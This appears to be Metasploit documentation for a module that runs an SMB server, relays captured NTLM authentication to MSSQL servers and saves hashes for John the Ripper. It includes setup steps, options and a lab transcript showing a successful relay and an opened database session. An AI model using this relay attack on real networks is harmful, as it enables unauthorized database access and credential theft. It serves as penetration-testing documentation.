## Vulnerable Application

This module supports running an SMB server which validates credentials, and then attempts to execute a relay attack
against an MSSQL server on the configured RHOSTS hosts.

If the relay succeeds, an MSSQL session to the target will be created. This can be used by any modules that support
MSSQL sessions, like `admin/mssql/mssql_enum`. The session can also be used to run arbitrary queries.

Supports SMBv2, SMBv3, and captures NTLMv1 as well as NTLMv2 hashes.
SMBv1 is not supported - please see https://github.com/rapid7/metasploit-framework/issues/16261

## Verification Steps
Example steps in this format (is also in the PR):

1. Install MSSQL Server on a Domain Joined host. Ensure that Windows Authentication mode is enabled.
2. Start msfconsole, and use the module.
3. Set `RHOSTS` to target the MSSQL server.
4. On another host, use `net use` to trigger an authentication attempt to metasploit that can be relayed to the target.

## Options

### RHOSTS

Target address range or CIDR identifier to relay to.

### JOHNPWFILE

A file to store John the Ripper formatted hashes in. NTLMv1 and NTLMv2 hashes
will be stored in separate files.
I.E. the filename john will produce two files, `john_netntlm` and `john_netntlmv2`.

### RELAY_TIMEOUT

Seconds that the relay socket will wait for a response after the client has
initiated communication.

## Scenarios
Specific demo of using the module that might be useful in a real world scenario.

### MSSQL Server 2019

```
[*] Auxiliary module running as background job 0.
[*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started.
msf auxiliary(server/relay/smb_to_mssql) > 
[*] New request from 192.168.159.10
[*] Received request for MSFLAB\smcintyre
[*] Relaying to next target mssql://192.168.159.166:1433
[+] Identity: MSFLAB\smcintyre - Successfully authenticated against relay target mssql://192.168.159.166:1433
[+] Relay succeeded
[*] MSSQL session 1 opened (192.168.159.128:35967 -> 192.168.159.166:1433) at 2025-10-21 09:33:19 -0400
[*] Received request for MSFLAB\smcintyre
[*] Identity: MSFLAB\smcintyre - All targets relayed to
[*] New request from 192.168.159.10
[*] Received request for MSFLAB\smcintyre
[*] Identity: MSFLAB\smcintyre - All targets relayed to
[*] Received request for MSFLAB\smcintyre
[*] Identity: MSFLAB\smcintyre - All targets relayed to

msf auxiliary(server/relay/smb_to_mssql) > sessions -i -1
[*] Starting interaction with 1...

mssql @ 192.168.159.166:1433 (master) > query 'SELECT @@version'
Response
========

    #  NULL
    -  ----
    0  Microsoft SQL Server 2019 (RTM-GDR) (KB5065223) - 15.0.2145.1 (X64) 
    Aug 13 2025 11:31:46 
    Copyright (C) 2019 Microsoft Corporation
    Standard Edition (64-bit) on Windows Server 2025 Standard 10.0 <X64> (Build 26100: ) (Hypervisor)

mssql @ 192.168.159.166:1433 (master) > 
```